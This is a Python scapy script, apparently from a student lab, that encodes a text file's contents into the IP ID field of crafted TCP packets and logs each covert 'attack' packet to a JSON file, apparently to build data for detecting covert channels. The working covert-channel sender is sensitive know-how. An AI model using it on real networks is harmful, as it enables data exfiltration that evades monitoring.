from scapy.all import IP, TCP, send
import time
import json
from datetime import datetime

ATTACK_LOG_PATH = "C:/Users/Nikitha/Downloads/5th_sem/aiml_dbms_lab/SendPackets/attack_log.json"
SAMPLE_TEXT = "C:/Users/Nikitha/Downloads/5th_sem/aiml_dbms_lab/sample_text.txt"

# -------------------------
# Convert 2 characters -> 16-bit IP ID
# -------------------------
def chars_to_ipid(chars):
    chars = chars.ljust(2)[:2]
    b = chars.encode('utf-8', errors='replace')
    return int.from_bytes(b, 'big')


# -------------------------
# Load file -> return list of (block, ipid_num)
# -------------------------
def load_chunks(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        text = f.read()

    # pad text to multiple of 2
    while len(text) % 2 != 0:
        text += " "

    chunks = []
    for i in range(0, len(text), 2):
        block = text[i:i+2]
        num = chars_to_ipid(block)
        chunks.append((block, num))

    return chunks


# -------------------------
# Append an entry to the attack_log.json array (creates file if missing)
# -------------------------
def append_attack_log(entry, path=ATTACK_LOG_PATH):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if not isinstance(data, list):
                data = []
    except (FileNotFoundError, json.JSONDecodeError):
        data = []

    data.append(entry)

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)


# -------------------------
# Send packets carrying covert data inside IP ID field
# -------------------------
def send_ipid_chunks(chunks, src_ip, dst_ip, dport=80, inter=0.02):
    packets = []
    seq_base = 1000  # baseline sequence number (left mostly unchanged)

    # determine next attack log id
    try:
        with open(ATTACK_LOG_PATH, 'r', encoding='utf-8') as f:
            existing = json.load(f)
            next_attack_id = (max((e.get('packet_id', 0) for e in existing), default=0) + 1) if existing else 1
    except (FileNotFoundError, json.JSONDecodeError):
        next_attack_id = 1

    for index, (block, ipid_num) in enumerate(chunks):
        pkt = IP(src=src_ip, dst=dst_ip, id=ipid_num) / TCP(
            sport=44444,
            dport=dport,
            seq=seq_base + index,  # keep seq as baseline
            flags="A",
            ack=0
        )

        packets.append(pkt)
        send(pkt, verbose=False)
        print(f"Sent block '{block}' as IPID={ipid_num}")

        # Log the attack in the attack_log.json array
        bits = ''.join(f'{ord(c):08b}' for c in block)
        entry = {
            "packet_id": next_attack_id,
            "modified_field": "IPID",
            "original_value": 0,  # original IPID unknown (0 for synthetic)
            "modified_value": ipid_num,
            "covert_bits": bits,
            "timestamp": datetime.now().timestamp()
        }

        append_attack_log(entry)
        next_attack_id += 1

        time.sleep(inter)

    return packets


if __name__ == "__main__":
    file_path = SAMPLE_TEXT
    src_ip = "198.168.1.6"
    dst_ip = "198.168.1.6"
    dport = 9988

    chunks = load_chunks(file_path)
    print(f"Loaded {len(chunks)} blocks.")

    send_ipid_chunks(chunks, src_ip, dst_ip, dport)
